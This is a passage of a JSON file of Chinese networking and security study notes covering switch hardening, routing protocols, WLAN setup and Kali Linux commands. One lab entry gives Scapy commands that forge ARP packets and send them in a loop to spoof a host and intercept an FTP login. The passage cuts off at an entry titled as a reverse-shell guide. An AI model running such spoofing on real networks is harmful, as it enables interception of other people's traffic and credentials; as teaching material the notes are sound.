PRIVILEGES;<br>EXIT;</code></pre><h3>3. 解压 WordPress</h3><p>将 WordPress 包上传至 <code>/var/www/html</code>，并解压：</p><pre><code>cd /var/www/html<br>tar -zxvf /path/to/wordpress.tar.gz<br>mv wordpress/* .<br>rmdir wordpress</code></pre><h3>4. 配置 WordPress</h3><pre><code>cp wp-config-sample.php wp-config.php<br>vi wp-config.php</code></pre><p>修改以下部分：</p><pre><code>define('DB_NAME', 'wordpress');<br>define('DB_USER', 'wp_user');<br>define('DB_PASSWORD', 'password');<br>define('DB_HOST', 'localhost');</code></pre><h3>5. 设置文件权限</h3><pre><code>sudo chown -R nginx:nginx /var/www/html<br>sudo find /var/www/html -type d -exec chmod 755 {} \\;<br>sudo find /var/www/html -type f -exec chmod 644 {} \\;</code></pre><h3>6. 启动 Web 服务</h3><pre><code>sudo systemctl start httpd<br>sudo systemctl enable httpd</code></pre><h3>7. 配置防火墙</h3><pre><code>sudo firewall-cmd --permanent --add-service=http<br>sudo firewall-cmd --permanent --add-service=https<br>sudo firewall-cmd --reload</code></pre><h3>8. 完成安装</h3><p>访问浏览器：<code>http://your-server-ip</code> 或 <code>http://your-domain.com</code><br>→ 选择语言 → 填写站点信息 → 安装 WordPress → 登录后台</p><h3>9. 配置 SSL（可选）</h3><pre><code>sudo yum install certbot python3-certbot-apache<br>sudo certbot --apache</code></pre><p>根据提示完成 HTTPS 配置。</p><h3>总结</h3><p>通过以上步骤，你可以在 CentOS 上成功部署并运行 WordPress，支持数据库访问、后台登录和网站发布。</p>",
    "type": 1
  },
  {
    "id": 18,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点08分",
    "title": "端口隔离",
    "content": "<h2>交换机端口隔离与拓扑配置</h2><p><strong>注意：</strong>vm0网卡不要关，按照topo建立拓扑，交换机为5700型号，路由器为2220型号</p><p>pc1-3按图依次配ip</p><p><strong>sw 上建立 vlan10，并配置与 PC 相连接的接口：</strong></p><pre><code>port link-type access<br>port def vlan 10</code></pre><p><strong>sw 在与 pc1, pc2 相连接接口下配置隔离：</strong></p><pre><code>port-isolate enable group 2</code></pre><p>这样配置后：</p><ul><li>pc1 与 pc2 之间无法通信</li><li>pc1 与 pc3 可通信</li><li>pc2 与 pc3 可通信</li></ul><p><strong>原理：</strong>隔离组中的端口之间无法通信，但可与组外通信。</p><p><strong>查看隔离组信息：</strong></p><pre><code>dis port-isolate 2</code></pre><p><strong>配置全局隔离模式：</strong></p><pre><code>port-isolate mode {all / l2}</code></pre><ul><li><code>all</code>：二层三层都隔离</li><li><code>l2</code>：仅二层隔离（默认）</li></ul><h3>更多</h3><p><strong>设置隔离模式：</strong>若未配置，则默认模式为 <code>l2</code>，可设置为 <code>all</code> 隔离二三层</p><pre><code>am isolate { l2 / all }</code></pre><p><strong>单项隔离：</strong>配置当前端口与特定接口隔离，实现 a 和 b 都无法向对方发送数据</p><pre><code>am isolate 接口id</code></pre>",
    "type": 2
  },
  {
    "id": 19,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点08分",
    "title": "MAC地址学习限制(动态MAC地址)",
    "content": "<h2>端口安全 Port Security 配置</h2><pre><code>port-security enable</code></pre><p>在端口下启用端口安全</p><pre><code>port-security max-mac-num &lt;数值&gt;</code></pre><p>设置最大mac地址学习数</p><pre><code>port-security protect-action protect / restrict / shutdown</code></pre><p>如若超过对大mac地址学习限制，将会：<br><strong>protect</strong>：丢弃数据包<br><strong>restrict</strong>：丢弃数据包并报警<br><strong>shutdown</strong>：关闭端口</p><pre><code>port-security mac-address sticky</code></pre><p>开启 sticky mac 模式</p><pre><code>port-security mac-address sticky &lt;mac地址&gt; vlan &lt;所属vlan&gt;</code></pre><p>绑定mac，如未特意配置 vlan 默认属于 vlan1</p><pre><code>dis mac-address security</code></pre><p>查看安全mac地址表</p><p><strong>说明：</strong>MAC地址可理解为机器的唯一身份ID，全球唯一，用以标记一台PC。</p><p><strong>举例说明：</strong><br>当pc4 ping pc1，经过 sw2 和 sw1，sw2 学到 pc4 的mac；随后 pc3 ping，sw2 又学到一个；再之后 pc5 ping，此时 sw1 接收到了3个mac。但 sw1 上的接口配置了最大mac学习数为 2，所以超过限制，将执行预设动作（如 shutdown），导致接口关闭。</p>",
    "type": 2
  },
  {
    "id": 20,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点12分",
    "title": "MAC地址漂流",
    "content": "<h2>MAC 地址漂移检测与自动恢复配置</h2><pre><code>dis mac-address</code></pre><p>查看学习到的mac地址表：mac地址：vlan号：接口：类型</p><pre><code>mac-address flapping trigger error-down</code></pre><p>进入接口配置漂移检测，检测到后报警并关闭接口</p><pre><code>error-down auto-recovery cause mac-address-flapping interval 500</code></pre><p>设定自动恢复时间间隔：每500秒检测一次是否恢复</p><pre><code>dis mac-address flapping record</code></pre><p>查看mac地址漂移记录</p>",
    "type": 2
  },
  {
    "id": 21,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点12分",
    "title": "MAC地址表安全",
    "content": "<h2>MAC 地址学习与限制配置</h2><p><strong>MAC 地址表项包含：</strong><br>MAC地址、接口、VLAN ID（如果有）</p><p><strong>MAC 地址的学习来源：</strong><br>基于数据包中携带的源 MAC 地址与目的 MAC 地址自动学习。</p><h3>理论示例：</h3><p>假设一台交换机 sw：<br>接口 g0/0/1 接入 pc1，g0/0/2 接入 pc2，pc1 ping pc2：</p><ul><li>发现不知道 pc2 的 MAC 地址，pc1 会广播 ARP 报文：<code>who tf is 10.1.1.2 call me: 10.1.1.1</code></li><li>使用广播 MAC 地址（如 ff:ff:ff:ff:ff:ff）发送，全网内所有主机（同 VLAN）都会收到</li><li>pc2 回复：<code>iam the fucking 10.1.1.2</code>，带源 MAC 回 pc1</li><li>pc1 组包完整包含目标 MAC 后发送，pc2 回复<br>sw 同时在过程中学习到 pc1 与 pc2 的 MAC 地址并记录在 MAC 表中</li></ul><p>We call this: <strong>二层交换</strong></p><h3>相关配置命令：</h3><p><strong>在接口下配置：</strong></p><pre><code>mac-address learning disabled action discard<br>Mac-limit maximum 100<br>Mac-limit alarm enable<br>Mac-limit action discard</code></pre><p><strong>在 VLAN 下配置（注意不是 int vlan）：</strong></p><pre><code>mac-address learning disable<br>Mac-limit maximum 100 alarm enable</code></pre><p><strong>查看 MAC 限制配置：</strong></p><pre><code>dis mac-limit</code></pre>",
    "type": 2
  },
  {
    "id": 22,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点12分",
    "title": "流量抑制",
    "content": "<h2>为什么要配置流量抑制？</h2><p>如果一个网络环境内，广播、未知组播、未知单播报文过多，可能会让其他用户的正常数据包受到干扰，导致网络缓慢甚至丢包。<br>我们配置流量抑制的目的是：限制这三类报文（广播 / 未知组播 / 未知单播）的发送速率，使其不会影响正常上网需求。</p><h3>配置命令</h3><pre><code>suppression mode by-packets</code></pre><p>设定抑制模式：基于数据包（<code>packets</code>）或数据流（<code>flow</code>）</p><pre><code>unicast-suppression 10-90</code></pre><p>设置单播报文的抑制阈值，单位为百分比。超过该值将被缓存或丢弃。</p><pre><code>multicast-suppression 10-90</code></pre><p>设置组播报文抑制阈值</p><pre><code>broadcast-suppression 10-90</code></pre><p>设置广播报文抑制阈值</p><pre><code>dis flow-suppression int 接口</code></pre><p>查看指定接口的流量抑制配置</p><p><strong>注意：</strong>不要将阈值设置过低，否则可能导致网络故障或业务中断</p>",
    "type": 2
  },
  {
    "id": 23,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点16分",
    "title": "广播风暴控制",
    "content": "<h2>什么是广播风暴</h2><p>广播风暴是指：在网络环境中由于环路或人为故意制造，导致数据包不断在网络中循环转发。<br>虽然数据包不会真正无限转发（因为 TTL 值为 0 时将被丢弃），但在达到该限制前会严重占用网络与设备资源。</p><h3>Storm Control 配置命令</h3><pre><code>storm-control whitelist protocol arp-request</code></pre><p>（该配置用于将 ARP 请求加入白名单，避免被风暴控制拦截 —— 实际效果可能依平台而异）</p><pre><code>storm-control broadcast min-rate 1000 max-rate 2000</code></pre><p>设定广播速率阈值为 1000 ~ 2000（单位通常为 pps）</p><pre><code>storm-control unicast min-rate 1000 max-rate 2000</code></pre><p>设定单播速率范围</p><pre><code>storm-control multicast min-rate 1000 max-rate 2000</code></pre><p>设定组播速率范围</p><pre><code>storm-control interval &lt;秒&gt;</code></pre><p>设置接口检测频率（单位秒）</p><pre><code>storm-control action block</code></pre><p>超出速率限制后的处理方式：<code>block</code> 表示阻塞端口，<code>error-down</code> 表示报错并关闭端口</p><pre><code>storm-control enable trap</code></pre><p>启用告警功能，向网管平台发送 trap 告警</p><pre><code>dis storm-control int &lt;接口&gt;</code></pre><p>查看某接口的风暴控制配置</p>",
    "type": 2
  },
  {
    "id": 24,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点16分",
    "title": "防范DOS、ARP欺骗",
    "content": "<h2>ARP 欺骗攻击原理与防护</h2><p><strong>攻击原理：</strong><br>PC1 向交换机不停发送 IP 不同、MAC 相同的 ARP 报文，交换机接收报文后发现 ARP 表中无此对应项，则将该报文的 IP 与 MAC 存入表项，若持续如此则 ARP 表被污染。</p><h3>搭建网络环境：</h3><ul><li>三层交换机接口：<code>vlan10 - 10.8.8.4/24</code>、<code>vlan20 - 10.9.9.4/24</code>、<code>vlan30 - 10.10.10.3/24</code></li><li>Server 位于 vlan30，IP 为 <code>10.10.10.2/24</code>，网关为三层接口 IP</li><li>左边汇聚交换机连接 vlan10，右边连接 vlan20；三口配置为 trunk，默认 vlan 并放行三个 vlan</li><li>左/右二层交换机分别连接对应 PC 区域（v10 与 v20），打 access，接上 PC</li><li>PC1-2：10.8.8.2/3；PC3-4：10.9.9.2/3，网关各自为三层交换机对应接口</li></ul><h3>ARP 严格学习配置：</h3><p>以下配置通常在汇聚或核心交换机（即三层交换机）上完成。</p><pre><code>arp learning strict</code></pre><p>开启 ARP 表项严格学习</p><pre><code>arp anti-attack entry-check fixed-mac enable</code></pre><p>开启 ARP 固化功能，防止伪造报文更新 ARP 表</p><pre><code>arp-miss speed-limit source-ip maximum &lt;数量&gt;</code></pre><p>限制交换机每秒允许处理的 ARP 报文总数</p><pre><code>arp-miss speed-limit source-ip &lt;IP&gt; maximum &lt;数量&gt;</code></pre><p>限制交换机每秒允许处理的某个 IP 的 ARP 报文数</p><pre><code>dis arp learning strict</code></pre><p>查看 ARP 严格学习配置状态</p><p><strong>接口下配置：</strong></p><pre><code>arp-limit vlan &lt;vlan-id&gt; maximum &lt;数量&gt;<br>arp speed-limit source-mac &lt;mac地址&gt; maximum &lt;数量&gt;</code></pre><p>用于限制特定 VLAN 或特定 MAC 每秒可处理的 ARP 报文数量</p>",
    "type": 2
  },
  {
    "id": 25,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点16分",
    "title": "防范中间人攻击",
    "content": "<h2>ARP 欺骗攻击与动态检测防御</h2><p><strong>攻击原理：</strong></p><p>例如：PC1 与 PC2 通信，PC3 位于其间，伪造 ARP 报文，让 PC1 和 PC2 都误以为 PC3 是彼此，从而使数据经过 PC3 转发，被其查看或篡改。</p><p>示例 1：PC3 向 PC1 发送伪造为 PC2 的 ARP 报文（即将自身 MAC 与 PC2 IP 绑定），PC1 学习后将后续发往 PC2 的数据转给 PC3。</p><p>示例 2：PC3 向 PC1 说“我就是 PC2”，同时向 PC2 说“我就是 PC1”，PC1 和 PC2 都会将通信数据发给 PC3。</p><h3>解决方案：使用 DAI 动态 ARP 检测</h3><p>基于 DHCP snooping 建立可信 IP-MAC-端口-VLAN 表，当收到 ARP 报文时，会核对发送者 IP/MAC/VLAN 与实际记录，不符即丢弃。</p><h3>配置步骤：</h3><p><strong>二层交换机：</strong></p><ul><li>创建 vlan 10</li><li>向下接口打 access 并设定默认 vlan10</li><li>向上接口打 trunk 并放行 vlan10</li></ul><p><strong>三层交换机：</strong>作为 DHCP Server</p><ul><li>向下接口打 trunk 放行 vlan10</li><li>为 vlan10 配置接口 IP（例如 10.0.0.254/24）</li></ul><pre><code>ip pool &lt;名称&gt;<br>network 10.0.0.0 mask 255.255.255.0<br>gateway-list 10.0.0.254<br>dhcp enable</code></pre><p>开启 DHCP：</p><pre><code>dhcp select global</code></pre><p>客户端使用 <code>ipconfig /renew</code> 获取地址</p><h3>汇聚层交换机配置动态 ARP 检测</h3><p>进入 PC 接口：</p><pre><code>arp anti-attack check user-bind enable<br>arp anti-attack check user-bind alarm enable</code></pre><p>因为 ARP 动态检测依赖 DHCP snooping：</p><pre><code>dhcp enable<br>dhcp snooping enable</code></pre><p>开启 vlan10 的 snooping：</p><pre><code>interface vlan 10<br>dhcp snooping enable</code></pre><p>配置与 DHCP Server 相连接口为信任口：</p><pre><code>interface G0/0/x<br>dhcp snooping trust</code></pre><p><strong>静态绑定：</strong></p><pre><code>user-bind static ip-address &lt;ip&gt; mac-address &lt;mac&gt; vlan &lt;vlan-id&gt; interface &lt;端口&gt;</code></pre><p><strong>查看状态：</strong></p><pre><code>dis arp anti-attack configuration check user-bind interface &lt;接口&gt;<br>dis arp anti-attack statistics check user-bind interface &lt;接口&gt;</code></pre>",
    "type": 2
  },
  {
    "id": 26,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点16分",
    "title": "IP Source Guard技术(IPSG)",
    "content": "<h2>IP Source Guard (IPSG) 防范非法主机</h2><p>部署在二层交换机上，用于防止非法主机通过伪造 IP 地址冒充合法主机，从而达到类似 ARP 中间人攻击的目的。</p><p><strong>原理：</strong>交换机会根据绑定表（包含 IP、MAC、VLAN、入接口）验证接收到的报文是否匹配，匹配则放行，不匹配则丢弃。</p><p><strong>绑定方式分为：静态 与 动态</strong></p><h3>一、静态绑定</h3><p><strong>拓扑说明：</strong>RT 接三层交换机，SW 下两台 PC，分别为 10.0.0.1 和 10.0.0.11/24，网关为 10.0.0.254。</p><pre><code>user-bind static ip-address &lt;IP&gt; mac-address &lt;MAC&gt;</code></pre><p>将 PC1 和 PC2 的 IP 与 MAC 静态绑定</p><p><strong>在 SW 上所有接 PC 接口：</strong></p><pre><code>ip source check user-bind enable<br>ip source check user-bind alarm enable<br>ip source check user-bind alarm threshold 200</code></pre><p>配置完成后，若 PC2 修改其 IP 地址尝试通信，将无法 ping 通网关。</p><h3>二、动态绑定</h3><p><strong>拓扑说明：</strong>SW 下接 SW2，SW2 下两台 PC，通过 DHCP 获取地址</p><p><strong>三层交换机配置：</strong></p><pre><code>vlan 10<br>interface vlan 10<br>ip address 10.1.1.1 255.255.255.0<br>dhcp enable</code></pre><pre><code>ip pool sbhuawei<br>network 10.1.1.0 mask 255.255.255.0<br>gateway-list 10.1.1.1</code></pre><pre><code>dhcp select global</code></pre><p><strong>二层交换机配置：</strong></p><pre><code>vlan 10<br>下行口 access 且 port default vlan 10<br>上行口 trunk 放行 vlan 10</code></pre><p><strong>启用 DHCP snooping：</strong></p><pre><code>dhcp enable<br>dhcp snooping enable</code></pre><p><strong>在 vlan 10 下启用：</strong></p><pre><code>interface vlan 10<br>dhcp snooping enable</code></pre><p><strong>设置信任接口：</strong></p><pre><code>interface &lt;上行接口&gt;<br>dhcp snooping trust</code></pre><p><strong>启用动态 IP Source Guard：</strong></p><pre><code>ip source check user-bind enable</code></pre>",
    "type": 2
  },
  {
    "id": 27,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "Open Shortest Path First技术(OSPF)",
    "content": "<h2>OSPF 基本配置与命令</h2><pre><code>ospf 1</code></pre><p>开启 OSPF 进程，进程号为 1</p><pre><code>area 0</code></pre><p>指定 OSPF 区域为 0（Backbone 区域）</p><pre><code>network &lt;ip地址&gt; &lt;反掩码&gt; area 0</code></pre><p>发布路由网段，注意使用 <strong>反掩码（Wildcard Mask）</strong> 而非子网掩码</p><pre><code>display ospf peer</code></pre><p>查看 OSPF 邻居状态、Hello 成功建立等信息</p><pre><code>display ip routing-table</code></pre><p>查看当前路由表，验证是否已成功学习到 OSPF 路由</p>",
    "type": 2
  },
  {
    "id": 28,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "VTY下用户AAA认证",
    "content": "<h2>VTY 登录与 AAA 用户认证配置</h2><p><strong>配置远程登录用户数量：</strong></p><pre><code>user-interface vty 0 1</code></pre><p>允许远程连接用户 2 个（0 和 1），数字从 0 开始记</p><p><strong>启用 AAA 认证：</strong></p><pre><code>authentication-mode aaa</code></pre><p>将当前 VTY 登录方式改为 AAA 模式</p><p><strong>进入 AAA 配置：</strong></p><pre><code>aaa</code></pre><p><strong>配置本地用户：</strong></p><pre><code>local-user &lt;用户名&gt; password cipher &lt;密码&gt;</code></pre><p>设置用户的加密密码</p><pre><code>local-user &lt;用户名&gt; service &lt;服务类型&gt;</code></pre><p>指定用户允许使用的服务（如 telnet、ssh）</p><pre><code>local-user &lt;用户名&gt; privilege level &lt;等级&gt;</code></pre><p>设置用户权限等级（最大值为 15，具有最高权限）</p>",
    "type": 2
  },
  {
    "id": 29,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "STP生成树协议",
    "content": "<h2>STP：二层网络生成树协议</h2><p>STP（Spanning Tree Protocol）用于在二层网络中阻止环路的发生。通过计算与选举，会自动 shutdown 某些端口，使得最终的网络拓扑形成一个无环结构。</p><p><strong>配置注意：</strong>网络中所有参与生成树的设备均需启用 STP。</p><h3>基础命令</h3><pre><code>stp enable</code></pre><p>启用生成树协议</p><pre><code>stp mode stp</code></pre><p>设置生成树模式为标准 STP 模式（也可设置为 RSTP/MSTP 视情况）</p><pre><code>display stp brief</code></pre><p>查看生成树选举状态、根桥、角色信息等</p><h3>优先级与根桥配置</h3><pre><code>stp priority &lt;INT&gt;</code></pre><p>设置设备的优先级（INT 取值如：0、4096、8192、17384、3768），值越小优先级越高。<br><strong>0：</strong>强制成为根桥；<br><strong>4096：</strong>备用根桥</p><pre><code>stp root primary</code></pre><p>自动设置本设备优先级为根桥（优先值最低）</p><pre><code>stp root secondary</code></pre><p>自动设置本设备为备用根桥（次低优先值）</p>",
    "type": 2
  },
  {
    "id": 30,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "VRRP虚拟路由冗余备份协议",
    "content": "<h2>VRRP：虚拟路由冗余协议与故障切换</h2><p><strong>应用场景：</strong><br>当出口路由器 RT2 出现故障时，自动切换到 RT3 进行数据转发。优点是：客户机始终使用统一网关地址，当主路由失效时系统会自动切换网关指向，确保网络不中断。</p><p><strong>拓扑结构：</strong><br>RT1 下连 RT2 与 RT3，RT2/RT3 下连同一个交换机 SW1，SW1 下接 PC。<br>RT2 与 RT3 下行接口分别使用除 <code>.254</code> 以外的地址，<code>.254</code> 用作 VRRP 虚拟 IP，PC 的网关设为 <code>192.168.1.254</code></p><h3>RT2（主）配置：</h3><pre><code>interface GigabitEthernet0/0/x<br>vrrp vrid 1 virtual-ip 192.168.1.254<br>vrrp vrid 1 priority 120<br>vrrp vrid 1 preempt-mode timer delay 60<br>vrrp vrid 1 track interface GigabitEthernet0/0/1 reduced 30</code></pre><p><strong>说明：</strong><br>VRID 设置为 1，虚拟 IP 为 192.168.1.254，优先级设置为 120，开启抢占并延迟 60 秒，如果上行链路 G0/0/1 失效，则优先级降低 30 触发备份路由接管。</p><h3>RT3（备份）配置：</h3><pre><code>interface GigabitEthernet0/0/x<br>vrrp vrid 1 virtual-ip 192.168.1.254</code></pre><p>默认优先级为 100，可不配置，确保 <code>vrid</code> 和虚拟 IP 与主路由一致。无需配置抢占。</p><p><strong>注意事项：</strong><br>1. VRID 必须一致，才能协商成功<br>2. 若在 VLAN 接口上配置 VRRP，需确保中间交换机放通该 VLAN<br>3. VRRP 仅提供网关冗余，不保证路由连通性，仍需手动配置静态路由或动态路由协议确保网络可达</p>",
    "type": 2
  },
  {
    "id": 31,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "MSTP多生成树协议",
    "content": "<h2>MSTP：多生成树协议配置</h2><p>MSTP（Multiple Spanning Tree Protocol）是生成树协议的增强版本，可支持多个 VLAN 映射到多个实例，提升链路资源利用率。</p><h3>基础配置步骤：</h3><pre><code>stp region-configuration</code></pre><p>进入 MSTP 区域配置模式（所有参与 MSTP 的设备域名必须一致）</p><pre><code>region-name &lt;实例名&gt;</code></pre><p>设置 MSTP 区域名称</p><pre><code>instance &lt;编号&gt; vlan &lt;VLAN号&gt;</code></pre><p>新建 MSTP 实例并绑定指定 VLAN</p><pre><code>active region-configuration</code></pre><p>激活区域配置</p><h3>设置实例优先级与根桥：</h3><pre><code>stp instance &lt;编号&gt; priority &lt;优先级&gt;</code></pre><p>设置 MSTP 实例的优先级，数值越小优先级越高</p><pre><code>stp instance &lt;编号&gt; root primary</code><br><code>stp instance &lt;编号&gt; root secondary</code></pre><p>设定该设备在某实例中为主根或次根<br>（建议：一台设备设为主，另一台设为次，提高可靠性）</p><h3>接口级别根保护配置：</h3><pre><code>interface &lt;接口名&gt;<br>stp root-protection</code></pre><p>对连接其他 MSTP 设备的端口启用根保护，防止意外切换根桥</p>",
    "type": 2
  },
  {
    "id": 32,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "端口镜像(1:1 and N:1)",
    "content": "<h2>Port Mirroring：1:1 与 多:1 镜像配置</h2><p><strong>拓扑结构：</strong><br>PC1（10.0.0.2，网关 10.0.0.1）接入 RT1 左口，RT1 右口连接 RT2，RT2 下接交换机 SW1，SW1 接 PC2（10.1.0.10，网关 10.1.0.2）。<br>另有 PC3（10.2.0.2，网关 10.2.0.1）左接 RT1。</p><h3>一、1:1 端口镜像（单个源口 → 目标观察口）</h3><p><strong>应用场景：</strong>将 PC1 访问 PC2 的数据流镜像至 RT2 的接口供抓包。</p><pre><code>interface &lt;观察口&gt;<br>observe-port interface GigabitEthernet0/0/x</code></pre><p>指定 RT2 接口为观察口（接收镜像流量）</p><pre><code>interface &lt;镜像源口&gt;<br>mirror to observe-port both</code></pre><p>在 RT1 的 client 接口（PC1 所在口）设置镜像方向为 both（入出都镜像）<br>可选值：<br><code>inbound</code> - 仅镜像入方向流量<br><code>outbound</code> - 仅镜像出方向流量</p><p><strong>效果：</strong>Client ping Server，抓包 RT2 口可观察到 ICMP 流量</p><h3>二、多:1 端口镜像（多个源口 → 同一观察口）</h3><p><strong>拓扑扩展：</strong>RT1 增加左口连接 PC3（10.2.0.2），希望同时观察 PC1 和 PC3 的流量。</p><p>在观察口不变的情况下，对多个源接口配置镜像：</p><pre><code>interface GigabitEthernet0/0/x<br>mirror to observe-port both</code><br><pre><code>interface GigabitEthernet0/0/y<br>mirror to observe-port both</code></pre><p>这样多个口的流量可同时被镜像到观察口 RT2，用于统一抓包分析。</p>",
    "type": 2
  },
  {
    "id": 33,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "AC+AP无线局域网配置",
    "content": "<h2>AP + AC 无线局域网搭建</h2><p><strong>概述：</strong><br>AC 与 AP 使用 trunk 链路连接，放行并设定管理 VLAN 为默认 VLAN。配置 VLAN 接口 IP 并通过 WLAN 视图创建域模板与 AP 组，再在全局配置 CAPWAP 源接口。AP 使用 MAC 绑定验证，创建 AP 实例并加入 AP 组。</p><h3>一、AC 配置 VLAN 接口</h3><pre><code>vlanif &lt;管理VLAN ID&gt;<br>ip address &lt;管理 IP&gt; 255.255.255.0</code></pre><h3>二、与 AP 接口配置</h3><pre><code>interface &lt;端口&gt;<br>port link-type trunk<br>port trunk allow-pass vlan &lt;管理VLAN&gt;<br>port trunk pvid vlan &lt;管理VLAN&gt;<br>port-isolate enable  # 可选，防止广播风暴</code></pre><h3>三、配置 DHCP</h3><pre><code>dhcp enable<br>interface vlanif &lt;管理VLAN&gt;<br>dhcp select interface</code></pre><h3>四、创建并配置 AP 组</h3><pre><code>wlan<br>ap-group name &lt;AP组名&gt;<br>regulatory-domain-profile name &lt;模板名&gt;<br>country-code CN</code></pre><p>进入 AP 组视图：</p><pre><code>ap-group name &lt;AP组名&gt;<br>regulatory-domain-profile &lt;模板名&gt;</code></pre><p>引用成功后按 Y 确认</p><p><strong>配置 CAPWAP 源接口：</strong></p><pre><code>capwap source interface vlanif &lt;管理VLAN&gt;</code></pre><h3>五、AP 验证方式与实例化</h3><pre><code>wlan<br>ap auth-mode mac-auth</code></pre><p>为每台 AP 创建实例并绑定：</p><pre><code>ap-id &lt;AP编号&gt; ap-mac &lt;MAC地址&gt;</code></pre><p>进入 AP 实例后绑定组：</p><pre><code>wlan-ap-id &lt;编号&gt;<br>ap-group &lt;AP组名&gt;</code></pre><h3>六、验证配置是否成功</h3><pre><code>display ap all</code></pre><p>若状态为 <code>normal</code> 且 IP 地址正常，说明配置成功。</p>",
    "type": 2
  },
  {
    "id": 34,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "Kali日常命令 - 1",
    "content": "<h2>Linux 用户管理命令</h2><pre><code>useradd -m &lt;用户名&gt;</code></pre><p>创建用户并同时创建主目录。</p><pre><code>usermod -aG &lt;组名&gt; &lt;用户名&gt;</code></pre><p>将用户加入附属组。</p><pre><code>usermod -L &lt;用户名&gt;</code></pre><p>锁定用户密码，禁止登录。</p><pre><code>usermod -U &lt;用户名&gt;</code></pre><p>解锁用户密码，允许登录。</p><pre><code>usermod -e YYYY-MM-DD &lt;用户名&gt;</code></pre><p>设定用户账户的失效日期。</p><pre><code>chage -l &lt;用户名&gt;</code></pre><p>查看用户密码过期、账户失效等信息。</p><pre><code>chfn &lt;用户名&gt;</code></pre><p>修改用户的个人信息（如全名、电话等）。</p><pre><code>userdel -r &lt;用户名&gt;</code></pre><p>删除用户并连同主目录一并删除。</p><pre><code>gpasswd -A &lt;用户名&gt; &lt;组名&gt;</code></pre><p>将用户设置为某个组的管理员。</p>",
    "type": 3
  },
  {
    "id": 35,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "使用Scapy实现ARP攻击",
    "content": "<h2>ARP 欺骗攻击实验（Scapy）</h2><h3>环境准备</h3><ul><li>将 Kali 网络适配器设置为 <code>vm8</code></li><li>服务器开启 FTP 服务</li><li>客户端使用账号 <code>1111</code>，密码 <code>123456</code> 进行 FTP 登录</li><li>根据拓扑设定静态 IP 地址</li></ul><p><strong>查看本机 ARP 表：</strong></p><pre><code>arp -a</code></pre><h3>使用 Scapy 构建 ARP 欺骗报文</h3><p><strong>1. 进入 Scapy：</strong></p><pre><code>scapy</code></pre><p><strong>2. 构建 ARP 包：</strong></p><pre><code>pkt = ARP()</code></pre><p><strong>3. 设置 ARP 欺骗字段：</strong></p><pre><code>pkt.psrc = '192.168.197.100'  # 冒充的原 IP<br>pkt.pdst = '192.168.197.20'   # 欺骗的目标 IP</code></pre><p><strong>4. 查看构造的 ARP 包：</strong></p><pre><code>pkt.show()</code></pre><p><strong>5. 循环发送伪造 ARP 包：</strong></p><pre><code>send(pkt, loop=1)</code></pre><p><em>说明：</em><code>loop=1</code> 表示死循环发送，实现持续的 ARP 欺骗。</p>",
    "type": 3
  },
  {
    "id": 36,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "Kali文件压缩",
    "content": "<h2>Linux 压缩与打包命令</h2><h3>一、gzip 压缩命令</h3><p><strong>基本语法：</strong></p><pre><code>gzip 文件名</code></pre><p>默认压缩后原文件会消失。</p><p><strong>常用参数：</strong></p><pre><code>-v       # 显示压缩过程<br>-d       # 解压缩<br>-1 ~ -9  # 1 为最快速但压缩率低，9 为最慢但压缩率高<br>-k       # 保留原始文件<br>-c 文件名 &gt; 文件名.gz  # 输出压缩内容到文件，并保留源文件</code></pre><h3>二、bzip2 压缩命令</h3><p>支持与 gzip 相同参数，压缩率高于 gzip。</p><h3>三、xz 压缩命令</h3><p>支持与 gzip 相同参数，压缩率高于 bzip2。</p><pre><code>xz -l 文件名.xz</code></pre><p>查看压缩信息。</p><h3>四、tar 打包命令</h3><pre><code>tar -c -f 包名.tar 目录名</code></pre><p>将目录打包为一个文件。</p><p><strong>常见参数：</strong></p><pre><code>-v  # 显示打包过程<br>-z  # 使用 gzip 压缩（生成 .tar.gz）<br>-j  # 使用 bzip2 压缩（生成 .tar.bz2）<br>-J  # 使用 xz 压缩（生成 .tar.xz）</code></pre><p><strong>查看打包内容：</strong></p><pre><code>tar -tvf 包名.tar</code></pre>",
    "type": 3
  },
  {
    "id": 37,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "Kali进程管理",
    "content": "<h2>Linux 进程管理命令</h2><h3>一、查看进程</h3><pre><code>ps</code></pre><p>显示当前用户的进程。</p><pre><code>ps -A</code></pre><p>显示系统所有进程。</p><pre><code>ps -a</code></pre><p>显示非与终端相关的进程。</p><pre><code>ps -aux</code></pre><p>显示更详细的进程信息（包括所有用户）。</p><h3>二、后台任务管理</h3><pre><code>jobs</code></pre><p>查看后台任务。</p><pre><code>jobs -l</code></pre><p>显示任务详细信息。</p><pre><code>fg %编号</code></pre><p>将后台挂起任务调回前台运行，编号为 <code>jobs</code> 命令中方括号内的数字。</p><h3>三、终止或控制进程</h3><pre><code>kill 进程号</code><br>kill %任务号</code></pre><p>终止进程，可使用 <code>ps</code> 或 <code>jobs</code> 查询对应号。</p><pre><code>kill -l</code></pre><p>查看所有支持的信号列表。</p><pre><code>kill -STOP 进程号</code></pre><p>暂停指定进程。</p><pre><code>kill -CONT 进程号</code></pre><p>恢复被挂起的进程。</p><h3>四、命令后台运行</h3><pre><code>命令 &amp;</code></pre><p>在命令后加 <code>&amp;</code> 可将任务放入后台运行。</p>",
    "type": 3
  },
  {
    "id": 38,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点22分",
    "title": "反向Shell远程控制",
